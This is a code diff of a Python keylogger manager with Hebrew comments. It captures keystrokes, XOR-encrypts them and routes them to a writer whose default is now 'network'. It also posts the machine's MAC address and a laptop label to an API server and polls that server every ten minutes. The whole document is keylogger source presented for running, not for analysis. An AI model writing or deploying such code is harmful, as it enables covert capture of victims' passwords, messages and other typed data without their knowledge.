@@ -3,17 +3,17 @@ import datetime
 import threading
 import uuid
 from key_logger import KeyLogger
-from FileWriter import FileWriter
 from encryption import Encryption
 from api_server import RequestManager
+from writer import Write_keys
 
 
 class Manager:
 
-    def __init__(self, timeLimit=0, storageLocation="json", time_wright=60):
+    def __init__(self, timeLimit=0, storageLocation="network", time_wright=60):
         self.time_wright = time_wright
         self.keylogger = KeyLogger()
-        self.file_writer = FileWriter()
+        self.write_keys = Write_keys()
         self.encryption = Encryption(5)
         self.running = False
         self.storageLocation = storageLocation
@@ -26,18 +26,15 @@ class Manager:
             try:
                 time.sleep(self.time_wright)
                 logged_keys = self.keylogger.get_logged_keys()
+                print("111111111")
                 if logged_keys:
                     timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
                     data = {timestamp: logged_keys}
-                    encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list(self.storageLocation, data)
-                    print(encrypted_data)
-
-                    # if self.storageLocation == "json":
-                    #     self.file_writer.Writes_to_file(encrypted_data)                    #
-                    # elif self.storageLocation == "network":
-                    #     pass  # שליחה לרשת (לא מוגדר כרגע)
+                    encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list( data)
+                    self.write_keys.handle_write(self.storageLocation,encrypted_data)
 
                     self.keylogger.clear_buffer()
+                    print("22222222")
                 threading.Thread(target=self.report_status_loop, daemon=True).start()  # הפעל דיווח קבוע
 
                 # אם יש מגבלת זמן והזמן עבר, הפסיק את ההקלטה
@@ -53,7 +50,7 @@ class Manager:
     
         status = {
             "macAddress": mac_address,
-            "name": "מחשב נייד של דני",
+            "name": "מחשב נייד של מוישי",
             "connected": connected,
             "timeLimit": self.timeLimit,
             "storageLocation": self.storageLocation,
@@ -62,8 +59,10 @@ class Manager:
         RequestManager().handle_request('POST', "status", status)
 
     def report_status_loop(self):
+        print("33333333")
         while self.keep_reporting:
-            RequestManager().handle_request(method='POST')
+            new_status = RequestManager().handle_request(method='GET',request_type="status")
+            print("4444444")
             time.sleep(600)  # המתן 10 דקות לפני הדיווח הבא
 
     def start(self):
@@ -79,6 +78,7 @@ class Manager:
         self.keep_reporting = True  # המשך לדווח לשרת
 
 
-if __name__ == '__main__':
-    a = Manager(timeLimit=180, time_wright=30)  # דוגמה להפעלה עם מגבלת זמן
+
+if           __name__ == '__main__':
+    a = Manager(timeLimit=0, time_wright=30)
     a.start()
